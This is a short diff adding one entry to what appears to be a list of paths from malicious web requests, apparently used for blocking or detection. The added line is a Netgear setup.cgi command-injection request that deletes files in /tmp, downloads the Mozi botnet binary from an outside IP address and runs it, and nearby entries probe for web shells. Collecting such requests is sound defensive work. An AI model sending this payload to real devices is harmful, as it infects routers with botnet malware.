@@ -15459,3 +15459,4 @@ http://apiv4.9hits.com/test
 /modules/mod_simplefileuploadv1.3/elements/file.php
 /assets/autoload_classmap.php
 /wp-includes/interactivity-api/flower.php
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.60.159.114:36313/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
